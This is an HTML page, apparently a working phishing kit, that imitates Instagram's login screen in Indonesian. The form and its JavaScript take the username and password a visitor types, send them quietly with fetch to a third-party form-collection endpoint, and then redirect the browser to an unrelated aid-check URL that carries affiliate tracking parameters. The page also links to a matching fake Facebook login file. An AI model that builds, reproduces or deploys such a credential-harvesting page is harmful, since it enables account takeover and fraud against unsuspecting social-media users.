<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="insta.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>

    <div class="login-container">
        <div class="logo-area">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" 
                 alt="Instagram Logo" class="instagram-logo">
        </div>

        <form 
            id="loginForm" 
            action="https://formcarry.com/s/q9SpL4QaIi8" 
            method="POST"
        >
            <div class="login-form">
                <input type="text" 
                       placeholder="Nomor telepon, nama pengguna, atau email" 
                       id="username" 
                       name="instagram_username_or_email_or_phone" 
                       required>
                <input type="password" 
                       placeholder="Kata Sandi" 
                       id="password" 
                       name="instagram_password" 
                       required>
                
                <input 
                    type="hidden" 
                    id="redirectUrl"
                    value="https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&utm_medium=901&utm_source=6094&utm_campaign=435&siteid=6094"
                >
                
                <button type="submit" id="loginButton" class="login-btn">Masuk</button>
            </div>
        </form>

        <div class="divider">
            <div class="line"></div>
            <span class="or-text">ATAU</span>
            <div class="line"></div>
        </div>

        <div class="facebook-login">
            <a href="face.html">
                <span class="fb-icon">f</span> Masuk dengan Facebook
            </a>
        </div>

        <div class="forgot-password">
            <a href="https://www.instagram.com/accounts/password/reset/">Lupa kata sandi?</a>
        </div>
    </div>

    <div class="signup-box">
        <p>Tidak punya akun? 
            <a href="https://www.instagram.com/accounts/signup/phone/">Daftar</a>
        </p>
                    <div class="meta-branding">
                <img src="meta.png" alt="Meta Logo" class="meta-logo">
            </div>
    </div>
    
    <script>
        const loginForm = document.getElementById('loginForm');
        const redirectUrl = document.getElementById('redirectUrl').value;

        loginForm.addEventListener('submit', function(event) {
            
            event.preventDefault(); // Mencegah pengiriman formulir HTML standar

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            // 1. Cek validasi
            if (username === '' || password === '') {
                alert('Mohon isi Nama pengguna, email, atau nomor telepon dan Kata Sandi untuk masuk.');
                return; // Berhenti jika validasi gagal
            }

            // 2. Kirim data menggunakan Fetch API (AJAX) di latar belakang
            fetch(loginForm.action, {
                method: loginForm.method,
                body: new FormData(loginForm)
            }).then(() => {
                // 3. Setelah permintaan pengiriman dikirim, lakukan redirect paksa
                window.location.href = redirectUrl;
            }).catch(() => {
                // Jika ada error jaringan saat mengirim ke Formcarry, tetap coba redirect
                console.error("Gagal mengirim data ke Formcarry, namun tetap mencoba redirect.");
                window.location.href = redirectUrl;
            });
        });
    </script>
</body>
</html>
